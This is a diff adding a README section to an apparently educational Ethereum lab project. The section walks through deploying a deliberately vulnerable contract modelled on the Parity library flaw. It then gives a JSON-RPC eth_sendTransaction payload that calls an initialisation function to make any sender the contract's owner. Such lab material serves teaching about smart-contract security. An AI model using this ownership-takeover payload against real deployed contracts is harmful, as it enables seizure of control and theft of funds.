@@ -106,3 +106,35 @@ personal.unlockAccount('youraccount', 'password', duration)
 
 Duration should be the time of unlocking in second. You can then go back to solidity-browser, and create your smart contract for good.
 When it is mined, an interface to interact with it should appear on the bottom-right.
+
+### IV HackParity Vulnerability
+
+To exploit the HackParity-like smart contract we developed :
+
+Copy/Paste it in a fresh window of the Smart Contract Window of our interface.
+
+On the Run tab, select ```TestLibrary```, mine it.
+
+Paste the address of the library in the ```_library variable``` of the smart contract ```Vulnerable Contract```. 
+
+Mine your ```VulnerableContract```.
+
+Your contract now has an owner which is the person who sent the transaction which created the contract.
+To hack it and change its owner, format a transaction like following :
+
+
+```json
+{"jsonrpc":"2.0",
+"method":"eth_sendTransaction",
+"params":
+[
+    {"from": <anyAddressWithMoney>, 
+    "to": <smartContractAddress>, 
+    "data": "0x19ab453c000000000000000000000000<newOwnerAddress>", 
+    "gas":"0x5ee0d", //At least 300000 in hexa here
+    "gasprice":"0x1"}],
+"id":<any int>}
+```
+
+Care with the gas. A gas estimate will only compute how much gas you need to send the transaction, not how much you need to execute the smart contract function. 300000 gas is a good start.
+Be careful, parameters must be sent in hexa.    
